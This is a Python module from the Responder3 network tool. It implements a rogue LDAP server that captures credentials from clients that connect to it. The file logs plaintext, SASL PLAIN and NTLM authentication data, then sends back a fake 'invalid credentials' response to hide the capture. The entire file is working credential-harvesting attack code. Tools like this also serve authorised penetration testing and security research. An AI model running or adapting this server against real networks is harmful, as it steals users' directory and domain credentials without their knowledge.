#!/usr/bin/env python3
#
# Author:
#  Tamas Jos (@skelsec)
#
# Module to grab LDAP credentials

import logging
import asyncio


from responder3.core.commons import *
from responder3.protocols.LDAP import *
from responder3.core.servertemplate import ResponderServer, ResponderServerSession
from responder3.protocols.NTLM import *

class LDAPSession(ResponderServerSession):
	def __init__(self, connection, log_queue):
		ResponderServerSession.__init__(self, connection, log_queue, self.__class__.__name__)
		self.auth_type = None
		self.auth_handler = None
		self.is_authed = False

	def __repr__(self):
		t  = '== LDAPSession ==\r\n'
		return t


class LDAP(ResponderServer):
	def init(self):
		self.parser = LdapParser
		self.parse_settings()
		
	def parse_settings(self):
		pass

	async def parse_message(self, timeout=None):
		try:
			req = await asyncio.wait_for(self.parser.from_streamreader(self.creader), timeout=timeout)
			return req
		except asyncio.TimeoutError:
			await self.log('Timeout!', logging.DEBUG)

	async def send_unauthorized_msg(self, msg_id):
		t = {
			'resultCode' : 49, # invalidcredz
			'matchedDN' : b'',
			'diagnosticMessage' : '8009030C: LdapErr: DSID-0C0906A1, comment: AcceptSecurityContext error, data 52e, v3839'.encode(),
		}
		po = {'bindResponse' : BindResponse(t)}
		b= {
			'messageID' : msg_id,
			'protocolOp' : protocolOp(po),					
		}
		resp = LDAPMessage(b)
		
		
		self.cwriter.write(resp.dump())
		await self.cwriter.drain()
		return

	async def run(self):
		try:
			while True:
				msg = await asyncio.wait_for(self.parse_message(), timeout = 2)
				if not msg:
					return
					
				req = msg.native
				
				if self.session.is_authed == False:
				
					msg_id = req['messageID']
					bindreq = msg['protocolOp'].chosen
					auth_data = req['protocolOp']['authentication']
					auth_type = bindreq['authentication'].chosen
					
					if isinstance(auth_type, SicilyPackageDiscovery):
						self.session.auth_type = 'NTLM'
						self.auth_handler = NTLMAUTHHandler()
						self.auth_handler.setup()
						
					if not self.session.auth_type:
						
						if isinstance(auth_type, SaslCredentials):
							#extend here if you with to support other SASL types
							if auth_data['mechanism'] == b'PLAIN':
								username, password = auth_data['credentials'][1:].split(b'\x00')
								cred = Credential(
										credtype = 'SASL - PLAIN',
										username = username.decode(), 
										password = password.decode(),
										fullhash='%s:%s' % (username.decode(), password.decode())		
									)
								await self.log_credential(cred)
							
							await self.send_unauthorized_msg(msg_id)
							return
							
						elif isinstance(auth_type, core.OctetString):
							cred = Credential(
										credtype = 'PLAIN',
										username = req['protocolOp']['name'].decode(), 
										password = req['protocolOp']['authentication'].decode(),
										fullhash='%s:%s' % (req['protocolOp']['name'].decode(), req['protocolOp']['authentication'].decode())		
									)
							await self.log_credential(cred)
							await self.send_unauthorized_msg(msg_id)
							return
						
						
							
					if self.session.auth_type == 'NTLM':
						if isinstance(auth_type, SicilyPackageDiscovery):
							t = {
								'resultCode' : 0,
								'matchedDN' : 'NTLM'.encode(),
								'diagnosticMessage' : b'',
								
							}
							po = {'bindResponse' : BindResponse(t)}
							b= {
								'messageID' : msg_id,
								'protocolOp' : protocolOp(po),					
							}
							resp = LDAPMessage(b)
							
							
							self.cwriter.write(resp.dump())
							await self.cwriter.drain()
							continue
							
						elif isinstance(auth_type, SicilyNegotiate) and isinstance(self.auth_handler, NTLMAUTHHandler):
							status, challenge, creds = self.auth_handler.do_AUTH(auth_data)
							t = {
								'resultCode' : 0,
								'matchedDN' : challenge,
								'diagnosticMessage' : b'',
								
							}
							po = {'bindResponse' : BindResponse(t)}
							b= {
								'messageID' : msg_id,
								'protocolOp' : protocolOp(po),					
							}
							resp = LDAPMessage(b)
							
							
							self.cwriter.write(resp.dump())
							await self.cwriter.drain()
						
						elif isinstance(auth_type, SicilyResponse) and isinstance(self.auth_handler, NTLMAUTHHandler):
							status, challenge, creds = self.auth_handler.do_AUTH(auth_data)
							if creds:
								for cred in creds:
									await self.log_credential(cred.to_credential())
									
							await self.send_unauthorized_msg(msg_id)
							return
							
					else:
						raise Exception('Unknown auth type!')
					
				
					
		except Exception as e:
			await self.log_exception()
			pass
